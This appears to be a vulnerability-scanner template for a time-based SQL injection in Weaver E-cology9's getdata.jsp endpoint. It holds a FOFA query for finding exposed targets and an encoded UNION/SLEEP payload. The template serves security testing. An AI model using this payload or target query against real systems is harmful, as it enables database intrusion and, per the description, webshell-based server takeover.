id: Weaver-E-Cology9-getdata-sql

info:
  name: 泛微E-cology9 getdata.jsp SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa：app="泛微-OA（e-cology）"
    该漏洞由于E-cology9 getdata.jsp 接口参数可控且直接带入拼接SQL语句，导致SQL注入漏洞产生，结合该软件多采用SQLServer类型数据，攻击者可利用该漏洞向数据库中写入数据，并导出Webshell，实现远程代码执行，进而获取服务器权限。
  reference:
    - 
  tags: SQL Injection
  
http:
  - raw:
      - |-
        GET /js/hrm/getdata.jsp?cmd=savect&arg0=%2531%2520%2575%256e%2569%256f%256e%2520%2573%2565%256c%2565%2563%2574%2520%2531%252c%2532%252c%2533%252c%2534%252c%2535%252c%2553%254c%2545%2545%2550%2528%2533%2529%2520%2523&arg1=1&arg2=2&arg3=3 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
        
    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code==200 && duration_1>=3 && duration_1<=4"